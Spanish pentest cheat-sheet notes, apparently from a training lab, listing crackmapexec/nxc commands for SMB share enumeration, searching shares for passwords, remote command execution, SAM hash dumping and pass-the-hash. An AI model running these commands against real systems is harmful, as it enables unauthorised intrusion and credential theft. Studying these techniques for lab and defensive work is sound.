[[RPCclient]]

```
crackmapexec smb [IP] --shares -u '' -p ''
```

Para buscar credenciales. Ej: passw
```
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
```

Enumerar usuarios conectados:
```
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

Ejecutar comandos:
```
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexe
```

Extraer SAM:
```
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

PassTheHass:
```
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```